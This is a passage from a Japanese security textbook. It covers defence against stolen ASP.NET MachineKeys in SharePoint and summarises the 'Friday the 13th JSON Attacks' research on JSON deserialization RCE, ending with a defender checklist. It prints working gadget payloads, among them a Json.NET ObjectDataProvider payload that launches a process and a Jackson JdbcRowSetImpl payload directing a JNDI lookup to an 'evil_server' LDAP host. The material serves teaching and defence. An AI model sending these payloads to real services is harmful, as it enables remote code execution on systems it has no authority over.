この記事が最も強く警告しているのは、次の一点に尽きる。**MachineKeyはサーバーの再起動やパッチ適用を跨いで有効であり続ける（persists through reboots）**。つまり、初回侵入の脆弱性そのものにパッチを当てても、事前に盗まれたMachineKeyが再発行されない限り、攻撃者は「そのMachineKeyで署名した悪意あるViewStateを、サーバー上の任意のASPXページに対して送りつける」という形で恒久的なバックドアアクセスを保持し続けられる。これは通常のWebシェル駆除やパッチ適用だけでは根絶できない、鍵ローテーションを要する種類のインシデントであるという点で、対応の優先順位を大きく左右する重要な事実である。

### 検知と対応の要点

記事はいくつかの実務的な検知・対応策を挙げている。

1. **Windowsイベントログ 4009番の監視**: これはASP.NETのViewState MAC検証失敗（`padding is invalid and cannot be removed`等）を伴うイベントで、攻撃者が鍵やパス情報を試行錯誤している最中、あるいは無関係なスキャナーがランダムなViewStateを送りつけている最中に大量発生することがある。平常時のベースラインを把握したうえで異常な増加を検知する運用が有効である。
2. **MachineKeyの疑わしい侵害が疑われた場合の即時再生成**: `web.config`の明示設定を削除して自動生成に戻す、あるいは新しい鍵を明示的に生成し全ファーム構成ノードに配布する。ここで重要なのは、ファーム内の全サーバーで鍵を統一しないとViewStateの相互検証が壊れる一方、鍵を統一すること自体が「1台の侵害が全台の鍵漏洩に直結する」という設計上のトレードオフを内包している点である。
3. **設定セクションの暗号化**: `aspnet_regiis -pe "system.web/machineKey"`のようなコマンドで`web.config`内の該当セクションをDPAPI等で暗号化し、ファイルを直接読まれても平文の鍵が得られないようにする。ただしこれはファイルシステムへの直接アクセスを防ぐものであり、ランタイムのリフレクション経由の窃取（ToolShellの手口そのもの）には効果がない点に注意が必要である。
4. **ネットワークセグメンテーションとWebシェル対策**: そもそもASPXファイルの設置（アップロード）を許さない設計、実行権限のあるディレクトリへの書き込み制限、Webルート配下のファイル整合性監視（FIM）が、鍵窃取の起点となるWebシェル設置自体を防ぐ一次防御になる。

> 出典: SANS ISC — Stealing Machine Keys for fun and profit (SharePoint) — https://isc.sans.edu/diary/32174

### 2つの事例から導く共通の防御原則

ここまでの2つの事例は、MachineKey窃取の経路が「設定ファイルの読み取り（パストラバーサル経由）」と「実行時のリフレクションによる直接抽出（Webシェル経由）」という異なる手段でありながら、その先のRCEに至るメカニズムはまったく同一（ysoserial.NETによるガジェットチェーン生成 → LosFormatterでのデシリアライズ実行）であることを示している。これは、ViewStateデシリアライゼーションという「最後の一撃」を防ぐ層と、MachineKeyという「鍵そのもの」を守る層は別々に設計・監視する必要があるということを意味する。

実務上の対策の優先順位としては、次のように整理できる。

- **恒久対策**: 可能であれば`.NET Framework`を最新にし、ViewStateのMACに`HMACSHA256`以上を強制する（`validation="HMACSHA256"`。SHA1は衝突耐性の観点でも非推奨）。加えて、EnableViewStateMacを無効化することは絶対に避ける（これはMAC検証そのものを無効にする設定で、過去に「ViewState検証エラーの応急処置」として無効化する誤った運用が広まった経緯があるが、これをやるとMachineKeyの窃取すら不要になり、任意のViewStateがそのまま実行されてしまう）。
- **鍵管理**: MachineKeyをソースコード管理やドキュメントに平文で残さない、Key Vault等の秘密管理サービスで一元管理する、ファーム全体で定期ローテーションを行う運用を組み込む。
- **多層防御**: パストラバーサル対策（正規化後のパスがベースディレクトリ配下にあることを検証する）、Webルートへの書き込み検知（Webシェル対策）、アウトバウンド通信の制限（DNSを含む）、ViewState検証失敗イベントの監視、を単独の対策として頼るのではなく重ねて配置する。

最後に強調しておきたいのは、これらの手口は本書では検知・防御・原理理解のためにのみ解説しており、実在するサービスや本番環境に対して無許可でパストラバーサルの試行やysoserial.NETによるペイロード送信を行うことは、対象の許可がない限り違法かつ非倫理的な行為である。防御側としては、自組織のSharePointおよびIISベースの.NETアプリケーションにおいて、MachineKeyの管理方法（平文で設定ファイルに書かれていないか、レジストリ格納の場合もリフレクション経由での窃取に備えた監視ができているか）を棚卸しすることが、本節の実践的な次の一歩となる。

## JSON系シンクの盲点（Friday the 13th JSON Attacks）

### この節のねらい

Javaのネイティブシリアライズ（`ObjectInputStream.readObject()`）や.NETの`BinaryFormatter`が危険であることは広く知られるようになった。その結果、多くの開発者は「バイナリのネイティブ形式をやめてJSONにすればデシリアライズ攻撃は防げる」と考えた。本節が扱うMuñoz & Miroshの研究「Friday the 13th JSON Attacks」（Black Hat / DEF CON 25, 2017）は、この**素朴な安心感が誤り**であることを示した。ここでいう「シンク（sink＝攻撃者が制御した入力が最終的に実行・解釈される危険な到達点）」は、JSONライブラリが**攻撃者の指定した型を復元し、その型のsetter・コンストラクタ・型変換器を呼び出す箇所**である。JSONというテキスト形式そのものは無害でも、そこに「どのクラスを作れ」という情報（**型ディスクリミネータ**）が混ざると、ネイティブシリアライズと同じRCE（Remote Code Execution）が成立してしまう。

### 攻撃が成立する3つの条件

著者らは、シリアライズ形式（JSON・XML・バイナリを問わない）が攻撃可能となる普遍的な条件を次の3点に整理した。これは本節の背骨なので最初に押さえてほしい。

1. **攻撃者が「復元される型」を制御できる**こと（型ディスクリミネータの注入）。
2. **復元されたオブジェクトに対して何らかのメソッドが呼ばれる**こと（setter・コンストラクタ・コールバック・型変換器など）。
3. **利用可能なガジェット空間が十分広い**こと。すなわち、呼ばれるメソッドを起点にコード実行まで連鎖（gadget chain）できる「都合のよいクラス」がクラスパス／GACに存在すること。

重要なのは、**この3条件は形式に依存しない**という結論である。「JSONだから」「テキストだから」安全にはならない。著者らは同じガジェットがJSON・XML・バイナリ・独自形式のいずれでも動くことを実証した。

> 出典: Friday the 13th JSON Attacks（Munoz & Mirosh, HPE Security Research, Black Hat July 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### なぜ「コールバックが無い＝安全」ではないのか（アンマーシャラの内部動作）

Javaの`readObject()`や.NETの`BinaryFormatter`が危険なのは、デシリアライズ中に**デシリアライズコールバック**（`readObject`、`IDeserializationCallback.OnDeserialization`など）が呼ばれ、その中で攻撃者制御のデータを使った処理が走るからだった。JSONライブラリは一般にこうしたコールバックの概念を持たないため、「安全そう」に見える。しかし著者らは、コールバックが無くても**オブジェクトを復元する過程で必ず何らかのメソッドが呼ばれる**点を突く。JSONアンマーシャラが`Java`/`.NET`オブジェクトを再構築する方式は主に3つある。

**(1) デフォルトコンストラクタ＋リフレクション**
引数なしコンストラクタでメモリを確保し、リフレクションでフィールドに値を直接書き込む方式（JSON-IOや「古典的」.NETデシリアライザなど）。「メソッドを呼ばないから安全そう」に見えるが、実際には次の抜け道がある。
- **デストラクタ**（例: `Finalize()`）はガベージコレクタが必ず呼ぶ。
- リフレクションで復元できない型（例: .NETの`Hashtable`はマシン/OSでハッシュ値が変わるため再計算が必要）があり、その過程で`HashCode()` `Equals()` `Compare()`などが呼ばれる。
- 例外ハンドラ経由で`toString()`が呼ばれることが多い。

**(2) デフォルトコンストラクタ＋setter**
引数なしコンストラクタで生成後、**publicなプロパティ／フィールドのsetterを呼んで**値を埋める方式。著者らが分析したJSONライブラリの**大半がこの方式**であり、setterが呼ばれることこそが本研究の中心的な攻撃面になる。

ここで.NETとJavaの違いが効いてくる。.NETは真のプロパティ（getter/setter）を言語機能として持つが、**Javaの「getter/setter」は単なる命名規約**にすぎない。「`set`で始まり引数1つ」という形さえ満たせば、ライブラリはそれを「setter」とみなして呼んでしまう。バッキングフィールドを持たない`setup()`のようなメソッドすら「setter」として起動され得る。この緩さが、後述の`JdbcRowSetImpl.setAutoCommit()`のような「setterに見えないsetter」ガジェットを可能にする。

**(3) 特殊コンストラクタ／デシリアライズコールバック**
`ISerializable`用の特殊コンストラクタ、`[OnDeserialized]`/`[OnDeserializing]`注釈メソッド、`IXmlSerializable`の`ReadXml()`など。JSONライブラリでこれを橋渡しするものは少数だが存在する。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### 型ディスクリミネータという「鍵」

攻撃の入口は、JSONに埋め込まれる**型ディスクリミネータ（type discriminator）**である。これは「この値をどのクラスに復元すべきか」をパーサに伝えるメタ情報で、ライブラリごとにキー名が異なる。

| キー | 主なライブラリ |
|---|---|
| `$type` | Json.NET、FastJSON、Sweet.Jayson など（.NET） |
| `@class` | JSON-IO、Genson など（Java） |
| `@type` / 任意プロパティ名 | Jackson（`@JsonTypeInfo`のproperty指定次第） |
| `__type` | 一部の.NETコンポーネント（例: WPFの`ResourceDictionary`連鎖）|

型ディスクリミネータが有効になるトリガーは2種類ある。**(a) デフォルトで常に有効**なライブラリ（FastJSON、Sweet.Jayson、JSON-IO、FlexSONなど）と、**(b) 設定で有効化**するライブラリ（Json.NETの`TypeNameHandling`、Jacksonの`enableDefaultTyping()`など）。前者は「untrustedデータに使ってはいけない」ものであり、後者は「安全でない設定にしなければ大丈夫」だが、多相性（polymorphism）を扱うために有効化されがちである。

さらに**型制御（Type Control）**の強さでも危険度が分かれる。
- **キャストのみ（弱い）**: いったん任意の型を復元し「終わってから」期待型へキャストする。キャスト例外が出る頃にはペイロードは既に実行済み。
- **期待型オブジェクトグラフ検査（弱い/強い）**: 期待型のメンバに代入可能な型だけ許すが、`Object`型メンバや非ジェネリックコレクションなど「何でも入る入口」が期待型グラフ内にあれば依然として攻撃可能。

著者らがまとめたライブラリ一覧（白書のTable）を要約する。

| ライブラリ | 言語 | 型ディスクリミネータ | 型制御 | 攻撃ベクトル |
|---|---|---|---|---|
| FastJSON | .NET | デフォルト | キャスト | setter |
| Json.Net | .NET | 設定 | 期待型グラフ検査（弱） | setter / コールバック / 型変換器 |
| FSPickler | .NET | デフォルト | 期待型グラフ検査（弱） | setter / コールバック |
| Sweet.Jayson | .NET | デフォルト | キャスト | setter |
| JavaScriptSerializer | .NET | 設定 | キャスト | setter |
| DataContractJsonSerializer | .NET | デフォルト | 期待型グラフ検査（強） | setter / コールバック |
| Jackson | Java | 設定 | 期待型グラフ検査（弱） | setter |
| Genson | Java | 設定 | 期待型グラフ検査（弱） | setter |
| JSON-IO | Java | デフォルト | キャスト | toString |
| FlexSON | Java | デフォルト | キャスト | setter |

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### Json.NETの `TypeNameHandling` を深掘りする

.NETで最も普及したJSONライブラリはJson.NET（Newtonsoft、白書時点でNuGet 6千万DL超）である。デフォルトでは型ディスクリミネータを**出力しない＝安全**だが、次のように`TypeNameHandling`を`None`以外にすると`$type`を解釈するようになる。

```csharp
var deser = JsonConvert.DeserializeObject<Expected>(json, new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All
});
```

あるいは特定プロパティに注釈を付ける形でも有効化される。

```csharp
[JsonProperty(TypeNameHandling = TypeNameHandling.All)]
public object Body { get; set; }
```

`TypeNameHandling`の値の意味は次の通り。**なぜ危険か**を理解する鍵は「型名を読む＝攻撃者が型を制御できる」という点にある。

| 値 | 数値 | 意味 |
|---|---|---|
| `None` | 0 | 型名を出力しない（唯一、untrustedデータに使ってよい値） |
| `Objects` | 1 | JSONオブジェクトに型名を含める |
| `Array` | 2 | JSON配列に型名を含める |
| `All` | 3 | 常に型名を含める |
| `Auto` | 4 | 宣言型と実型が異なるときだけ型名を含める |

Json.NETは「期待型に代入可能か」を検査するため一見安全に見える。しかし著者らは、期待型グラフ内に**次のいずれかを満たすメンバ**があれば依然として攻撃者が任意ガジェット型を注入できると指摘する。

- `System.Object`（Javaなら`java.lang.Object`）型のメンバ。
- 非ジェネリックコレクション（`ArrayList`、`Hashtable`など）。
- `IDynamicMetaObjectProvider`実装型。
- `System.Data.EntityKeyMember`またはその派生型（`EntityKeyMemberConverter`という**型変換器**経由で、`TypeNameHandling=None`でも攻撃が成立する特殊ケース）。

この検査は各プロパティについて**再帰的**に行われるため、利用可能な型の表面積は爆発的に広がり、開発者が安全に制御するのは非現実的である。

**実例: Breeze（CVE-2017-9424）** — .NETのデータ管理バックエンドフレームワークBreezeは`TypeNameHandling.All`を使う設定で、HTTP/JSON通信の型情報を攻撃者が改変できた。期待型`SaveOptions`が`public object Tag`という`Object`型プロパティを持っていたため、そこにガジェットを注入できた。**この脆弱性は設定や公開エンドポイントに関係なく全ユーザーに影響した**。報告(5/29)から**わずか2日**でv1.6.5(6/1)で修正された。

```csharp
public class SaveOptions {
    public bool AllowConcurrentSaves { get; set; }
    public Object Tag { get; set; }   // ← Object型が「何でも入る入口」になる
}
```

untrustedデータを扱う場合、Json.NETでは**`None`以外の`TypeNameHandling`を使わない**か、`SerializationBinder`で受け入れ型をホワイトリスト検証する以外に安全策はない。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### Java側: Jackson の `enableDefaultTyping()`

Java最普及のJacksonも、デフォルトでは型情報を出さないが、多相型や`Object`を扱うために有効化されがちである。

```java
// DefaultTyping.OBJECT_AND_NON_CONCRETE がデフォルト
objectMapper.enableDefaultTyping();
```

あるいはフィールド注釈で。

```java
@JsonTypeInfo(use=JsonTypeInfo.Id.CLASS,
             include=JsonTypeInfo.As.PROPERTY, property="@class")
public Object message;
```

`use=Id.CLASS`は「JSON内のクラス名(`@class`)をそのまま`Class.forName`相当で解決する」ことを意味し、これが攻撃者による型制御を許す。防御としては、**そもそも型情報を有効にしない**こと、必要なら`@JsonTypeInfo`を必要フィールドだけに限定し、`use`に`Id.CLASS`以外（`Id.NAME`＋明示的サブタイプ登録）を使うことが推奨される。この設計思想は後年のJacksonの「Polymorphic Type Handling無効化・`PolymorphicTypeValidator`必須化」（2.10以降, 2019〜）へと繋がっていく。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### エントリポイント探索（期待型オブジェクトグラフ）

型制御が「期待型グラフ検査」の場合、攻撃者はペイロードを置ける**エントリポイント（injection point）**を期待型のグラフ内から探す必要がある。著者らが挙げる探し方は次の通り。

- `Hashtable`・`ArrayList`など.NET非ジェネリックコレクション。
- `java.lang.Object` / `System.Object` 型メンバ。
- ジェネリック型（例: `Message<T>`）。
- **派生型で表面積を拡大**する: 例えば期待型が`System.Exception`なら、派生型`System.ComponentModel.DataAnnotations.ValidationException`は`System.Object`プロパティを持つのでそこに任意ガジェットを置ける（Javaでは`javax.management.InvalidApplicationException`が`Object`フィールドを持つ）。
- 親型のプロパティを使う。

これらは**再帰的**に適用できるため、期待型が具体的でも実質的に攻撃者は広い型空間を得る。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### .NET RCEガジェット（setter起点）

著者らはGAC（Global Assembly Cache）に存在する＝**第三者依存なしで使える**ガジェットを複数発見した。JSON経由でsetterが呼ばれることを利用する。以下は原典のペイロードだが、いずれも「なぜコード実行に至るか」を仕組みで理解することが目的であり、実在サービスや本番への無許可検証に用いてはならない。

**AssemblyInstaller** — `Path`のsetterが`Assembly.LoadFrom(value)`を呼ぶ。任意アセンブリをロードさせ、その`DllMain`や`[RunInstaller(true)]`型の静的コンストラクタでコードを走らせる。

```json
{"$type":"System.Configuration.Install.AssemblyInstaller, System.Configuration.Install, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a",
 "Path":"file:///c:/somePath/MixedLibrary.dll"}
```
理由: `set_Path`の内部が`this.assembly = Assembly.LoadFrom(value);`となっており、setterに値を入れるだけでアセンブリロード（＝コード実行機会）が発生するため。

**ObjectDataProvider（本命の万能ガジェット）** — 最も柔軟で、ほぼ全アンマーシャラで使える。`ObjectType`＋`MethodName`＋`MethodParameters`を指定すると、内部で`_objectType.InvokeMember(MethodName, ..., array, ...)`が実行され、**任意の型の任意メソッドを任意引数で呼べる**。

```json
{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
 "MethodName":"Start",
 "MethodParameters":{"$type":"System.Collections.ArrayList, mscorlib","$values":["calc"]},
 "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}}
```
理由: `set_MethodName`や`set_ObjectInstance`のsetterが内部で`base.Refresh()`→`QueryWorker()`→`InvokeMethodOnInstance()`を連鎖的に呼び、最終的に`InvokeMember`でリフレクション呼び出しに到達する。上例は`Process.Start("calc")`という**無害な検証用**の形。これが「setterを呼ぶだけで任意メソッド実行に化ける」ObjectDataProviderの本質である。

その他の.NETガジェット（仕組みのみ要約）:
- **WorkflowDesigner** — `set_PropertyInspectorFontAndColorData`がXAML文字列を`XamlReader.Load`でパースし、XAML内の`ObjectDataProvider`で静的メソッドを実行（STAスレッド要）。JSON→XAML→SSTI的連鎖の好例。
- **ResourceDictionary**（`__type`）— `set_Source`が任意URLへ`WebRequest`を投げ、応答が`application/xaml+xml`ならXAMLをロード。**外部サーバからXAMLペイロードを取得して実行**する。
- **BindingSource** — `set_DataSource`→`ResetList()`→任意getter呼び出し（`AssemblyInstaller`等へ連鎖）。
- **ExchangeSettingsProvider** — `set_ByteData`の内部で`new BinaryFormatter().Deserialize(...)`を呼ぶ。**JSONのsetterからネイティブ`BinaryFormatter`へ「橋渡し」**でき、JSON→バイナリデシリアライズの合流点になる。
- **TypeConverters** — `[TypeConverter]`注釈型の`ConvertFrom()`経由。例: `XamlSerializationWrapperConverter`はXAMLをロード、`EndpointCollectionConverter`はBase64→`BinaryFormatter.Deserialize`へ橋渡し。`EntityKeyMemberConverter`は前述の通り`TypeNameHandling=None`でも効く。

**PSObject（CVE-2017-8565系, PowerShell）** — PowerShell v3以降がインストールされた環境のGACに存在。`PSObject`のシリアライズコンストラクタが`CliXml`文字列を取り出し`PSSerializer.Deserialize(text)`で**二段目のデシリアライズ**を起動する。内部の`LanguagePrimitives.ConvertTo`が、攻撃者指定型の1引数コンストラクタ呼び出し・setter呼び出し・静的`Parse(string)`呼び出しといった変換を試み、最終的に`XamlReader.Parse()`で任意XAML（＝`Process.Start("calc.exe")`など）を実行できる。PowerShellが標準搭載される現代のWindowsで広く効く点が脅威。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### Java RCEガジェット

**JdbcRowSetImpl.setAutoCommit()（最重要, JRE標準）** — JavaランタイムのGACに相当する標準クラスにあり**外部依存不要**。`autoCommit`というフィールドは実在しないが、Jacksonやgensonは`"autoCommit"`属性を見ると`setAutoCommit()`を呼ぶ。その内部が`InitialContext().lookup(dataSourceName)`を実行するため、攻撃者のLDAP/RMIサーバへJNDIルックアップさせられる（JNDIインジェクション→リモートクラスロード→RCE）。

```json
{"@class":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"ldap://evil_server/uid=somename,ou=someou,dc=somedc",
 "autoCommit":true}
```
理由: `setAutoCommit(true)`→`connect()`→`ctx.lookup(getDataSourceName())`という流れで、`dataSourceName`のsetterに入れた値がそのままJNDIルックアップ先になるため。「setterに見えないが命名規約上setterとして呼ばれる」典型例。

その他のJavaガジェット:
- **hibernate `StatisticsService.setSessionFactoryJNDIName`** — setterが`InitialContext().lookup()`を呼ぶ。hibernate 3.1〜4.2系などに存在。
- **`antlr StringTemplate.toString`** — `toString`起点で任意getterを呼び、`TemplatesImpl.getOutputProperties()`等へ連鎖。
- **`atomikos RemoteClientUserTransaction.toString`** — `toString()`→`checkSetup()`→`InitialContext.lookup(name_)`でJNDI。

**JNDI攻撃ベクトルの注意（時事性）**: JDK update 121（2017, CVE対応）以降、RMIレジストリ/COSネーミング経由のリモートクラスロードはデフォルト無効化された。しかし当時**LDAPベクトルは依然有効**であった（その後8u191等で`com.sun.jndi.ldap.object.trustURLCodebase=false`がデフォルト化され塞がれていく）。JNDIガジェットの可否は**JREのバージョンとパッチ状況に強く依存**するため、評価時は必ず対象バージョンを確認すること。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### 自作パーサ・ラッパーの落とし穴

著者らは「暗号と同じで、仕組みを理解せず独自シリアライズ形式を作るな」と警告する。

**NancyFX（CVE-2017-9785）** — Ruby Sinatra風のWebフレームワーク。CSRF対策クッキー`NCSRF`が`CsrfToken`を`BinaryFormatter`でシリアライズ＋Base64したものだった。攻撃者は`PSObject`ペイロードをBase64化してクッキーに入れるだけでRCEできた（報告4/24、修正7/14）。興味深いことに、.NET Core対応のため2.x系が独自JSONパーサへ移行した後も、そのJSONに`"TypeObject":"Nancy.Security.CsrfToken, Nancy, ..."`という**型ディスクリミネータ**が含まれ、setterが呼ばれるため同じ攻撃が成立した。**バイナリからJSONへ変えても本質的問題は消えない**ことの好例。

**DotNetNuke（CVE-2017-9822）** — 未ログインユーザーのセッションを保存する`DNNPersonalization`クッキーが独自XMLで、`item`タグの`type`属性から期待型を取り`XmlSerializer`デシリアライザを生成していた。攻撃者が期待型を`List<Process, ObjectDataProvider>`のようなパラメトリック型にすることで`XmlSerializer`に任意型を「学習」させ、`ObjectDataProvider`ガジェットでコード実行に至った（報告6/1、修正7/6）。ここでも**型を攻撃者が制御できること**が核心であり、payloadの詳細な手順は防御学習の範囲を超えるため本書では扱わない。

> 出典: Friday the 13th JSON Attacks（Black Hat 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf

### 防御（開発者・レビュアー向けチェックリスト）

原典の結論を、実務で使える形に落とし込むと次のようになる。

1. **untrustedデータでは型ディスクリミネータを絶対に有効化しない。**
   - Json.NET: `TypeNameHandling`は`None`のみ。多相性が必要なら`SerializationBinder`（近年は`ISerializationBinder`）で**受け入れ型をホワイトリスト**化。
   - Jackson: `enableDefaultTyping()`を使わない。必要なら`@JsonTypeInfo`を最小限にし、`Id.CLASS`を避け、`PolymorphicTypeValidator`（2.10+）でホワイトリスト検証。
   - `@class`/`$type`/`__type`を**デフォルトで解釈するライブラリ**（FastJSON、Sweet.Jayson、JSON-IO、FlexSON、FSPickler、Hyperion、SharpSerializer等）はuntrustedデータに**使わない**。
2. **期待型を攻撃者に制御させない。** `DataContractSerializer`/`XmlSerializer`は期待型が固定なら比較的安全だが、`Type.GetType(userInput)`のように**入力から期待型を作る**コードは即座に脆弱化する（DotNetNukeパターン）。コード中の`Type.GetType`／`Class.forName`と入力の結び付きを監査せよ。
3. **`Object`型・非ジェネリックコレクション・弱い型リゾルバを排除する。** これらは期待型グラフ内の「何でも入る入口」になる。
4. **独自シリアライズ形式・ラッパーを作らない。** どうしても必要なら、型を一切信頼せず固定スキーマ＋明示的マッピングにする。
5. **JNDI・アセンブリロード・XAMLロードを行う「セキュリティ上センシティブな入口」を把握する。** setter1つがこれらを起動しうる。
6. **多層防御**: JRE/. NETランタイムを最新に保つ（JNDIリモートクラスロードのデフォルト無効化など）、デシリアライズ処理を最小権限・ネットワーク隔離環境で動かす。

**結論**: シリアライザ（アンマーシャラ）は暗号と同じ「セキュリティ上センシティブなAPI」であり、untrustedデータに使ってはならない。これはJava固有でも特定.NETフォーマッタ固有でもなく、JSON・XML・バイナリ・独自形式を問わない普遍的な問題である。すべてのシリアライザはオブジェクトを再構築するために何らかのメソッドを呼び、攻撃者はそれを起点にガジェット連鎖を組み立てる。「JSONだから安全」という思い込みこそが、この攻撃クラスが長く見逃されてきた最大の理由だった。

> 出典: Friday the 13th JSON Attacks（Munoz & Mirosh, Black Hat July 2017） — https://blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
